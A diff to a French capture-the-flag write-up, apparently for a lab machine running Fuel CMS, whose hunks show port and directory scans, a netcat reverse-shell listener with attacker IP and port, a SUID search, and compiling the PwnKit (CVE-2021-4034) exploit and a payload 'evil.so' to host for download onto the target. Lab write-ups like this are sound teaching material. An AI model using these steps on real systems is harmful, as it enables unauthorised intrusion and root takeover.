@@ -12,7 +12,7 @@
 | IP attaquant (`LHOST`) | **10.21.208.96** |
 | Port listener          | **4444**         |
 
-**Outils utilisés** : `nmap` (scan), `gobuster` (Bruteforce répertoires), navigateur web, `zip` (préparer l’archive du shell), `curl` (invoquer l’URL), `nc` (listener reverse‑shell), `gcc` (compiler l’exploit PwnKit).
+**Outils utilisés** : `nmap` (scan), `gobuster` (bruteforce répertoires), navigateur web, `zip` (préparer l’archive du shell), `curl` (invoquer l’URL), `nc` (listener reverse‑shell), `gcc` (compiler l’exploit PwnKit).
 
 ---
 
@@ -27,7 +27,7 @@ nmap -T4 -Pn -n -sC -sV -p- 10.10.242.71 -oA nmap/full
 Résultat : seul **80/tcp** (Apache) ressort ouvert.
 
 ```bash
-nikto -h http://10.10.242.71
+gobuster dir -u http://10.10.242.71/ -w common.txt -x php,html,txt,zip -t 50
 ```
 
 > Gobuster détecte rapidement les chemins et bannières courantes, (j'ai utilisé [common.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt)); il confirme la présence de plusieurs chemins, ce qui nous intéresse ici est la page `/fuel` (probablement l'interface admin).
@@ -121,10 +121,10 @@ cat /home/www-data/flag.txt
 
 ## 6. Élévation root (PwnKit)
 
-Lister les fichiers SUID :
+Après avoir check des possibles crons root, j'ai lister les fichiers SUID :
 
 ```bash
-find / -type f -perm -04000 -ls 2>/dev/null | grep pkexec
+find / -type f -perm -04000 -ls 2>/dev/null
 ```
 
 > On cherche les binaires avec le bit SUID ; `pkexec` est vulnérable à **CVE‑2021‑4034**.
@@ -135,7 +135,7 @@ Compiler l’exploit côté attaquant :
 gcc exploit.c -o pwnkit         # PoC Qualys
 ```
 
-Compiler la charge utile partagée :
+J'ai compiler la charge utile partagée puis hebergé nos 2 fichiers sur un serveur http pour pouvoir les télécharger sur notre cible :
 
 ```bash
 gcc -shared -fPIC evil.c -o evil.so
